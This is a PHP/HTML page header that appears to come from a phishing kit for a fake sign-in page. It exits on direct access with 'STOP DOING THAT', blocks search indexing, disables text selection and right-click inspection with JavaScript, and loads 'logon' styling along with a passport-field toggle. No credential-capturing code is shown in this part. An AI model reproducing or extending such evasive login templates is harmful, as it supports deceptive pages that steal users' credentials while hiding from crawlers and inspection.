<?php 

if (!defined('Myheader')){
	exit('STOP DOING THAT');
}
?>
<html xmlns="http://www.w3.org/1999/xhtml" class="no-js" lang="en" dir="ltr">
<head>
        <meta charset="utf-8">
		 <meta name="robots" content="none">
        <meta name="robots" content="noindex,nofollow">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		 <meta name="viewport" content="width=device-width, initial-scale=1.0">
		 <link id="favIconLink" rel="shortcut icon" type="image/x-icon" href="./assets/img/favicon.ico">
       
<script language="JavaScript1.2" type="text/javascript">

        function disableselect(e)
        {
                return false 
        }
        
        function reEnable()
        {
                return true
        }
        
       
        document.onselectstart=new Function ("return false")
        
        if (window.sidebar)
        {
              
        
                document.onclick=reEnable
        }
        
        function clickIE()
        {
                if (document.all)
                {
                        (message);
                        return false;
                }
        }
        
        document.oncontextmenu=new Function("return false")
        
</script>
        <script type="text/javascript">

</script>

        
       
        
        <style>@font-face {font-family: Open Sans;font-style: normal;font-weight: 400;src: url('assets/fonts/opensans-regular.eot?#iefix') format('embedded-opentype'),url('assets/fonts/opensans-regular.woff') format('woff'),url('assets/fonts/opensans-regular.ttf') format('truetype'),url('assets/fonts/opensans-regular.svg#opensans-regular') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 600;src: url('assets/fonts/opensans-semibold.eot?#iefix') format('embedded-opentype'),url('assets/fonts/opensans-semibold.woff') format('woff'),url('assets/fonts/opensans-semibold.ttf') format('truetype'),url('assets/fonts/opensans-semibold.svg#opensans-semibold') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 700;src: url('assets/fonts/opensans-bold.eot?#iefix') format('embedded-opentype'),url('assets/fonts/opensans-bold.woff') format('woff'),url('assets/fonts/opensans-bold.ttf') format('truetype'),url('assets/fonts/opensans-bold.svg#opensans-bold') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 800;src: url('assets/fonts/opensans-extrabold.eot?#iefix') format('embedded-opentype'),url('assets/fonts/opensans-extrabold.woff') format('woff'),url('assets/fonts/opensans-extrabold.ttf') format('truetype'),url('assets/fonts/opensans-extrabold.svg#opensans-extrabold') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 300;src: url('assets/fonts/opensans-light.eot?#iefix') format('embedded-opentype'),url('assets/fonts/opensans-light.woff') format('woff'),url('assets/fonts/opensans-light.ttf') format('truetype'),url('assets/fonts/opensans-light.svg#opensans-light') format('svg');}@font-face {font-family: videoplayer;font-style: normal;font-weight: normal;src: url('assets/fonts/videoplayer.eot?#iefix') format('embedded-opentype'),url('assets/fonts/videoplayer.woff') format('woff'),url('assets/fonts/videoplayer.ttf') format('truetype'),url('assets/fonts/videoplayer.svg#videoplayer') format('svg');}
        html {height:100%; background: #fff;}

        @media only screen and (min-width: 768px) {
        html {
        background:#1c4f82; background:-moz-linear-gradient(top,#1c4f82 0%, #2e6ea3 100%); background:-webkit-linear-gradient(top,#1c4f82 0%,#2e6ea3 100%); background:linear-gradient(to bottom,#1c4f82 0%,#2e6ea3 100%);
        }
        }
        </style>
		  		
		
		  
		  
		  
		  
		  
		  
		  
		  
		  
		  
		  
		  
		  
		  
<style>
/* The container */
.contx {
  display: block;
  position: relative;
  padding-left: 35px;
  margin-bottom: 2px;
  cursor: pointer;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
  font-size: 14px;
  color: #566573 ;
  line-height: 26px;
}

/* Hide the browser's default checkbox */
.contx input {
  position: absolute;
  opacity: 0;
  cursor: pointer;
  height: 0;
  width: 0;
}

/* Create a custom checkbox */
.checkmark {
  position: absolute;
  top: 0;
  left: 2px;
  height: 22px;
  width: 21px;
  border-radius: 5px;
  border: 1px solid #B2BABB;
    background: transparent;
}


/* When the checkbox is checked, add a blue background */
.contx input:checked ~ .checkmark {
  background-color: #2196F3;
}

/* Create the checkmark/indicator (hidden when not checked) */
.checkmark:after {
  content: "";
  position: absolute;
  display: none;
}

/* Show the checkmark when checked */
.contx input:checked ~ .checkmark:after {
  display: block;
}

/* Style the checkmark/indicator */
.contx .checkmark:after {
  left: 7px;
  top: 3px;
  width: 4px;
  height: 10px;
  border: solid white;
  border-width: 0 3px 3px 0;
  -webkit-transform: rotate(45deg);
  -ms-transform: rotate(45deg);
  transform: rotate(45deg);
}
</style>
<script type="text/javascript">
    function ShowHideDiv(chkPassport) {
        var dvPassport = document.getElementById("dvPassport");
        dvPassport.style.display = chkPassport.checked ? "block" : "none";
    }
</script>
	

  <link rel="stylesheet" href="./assets/css/logon.css">
  <link rel="stylesheet" href="./assets/css/blue-ui.css">
  
  

  
  </head>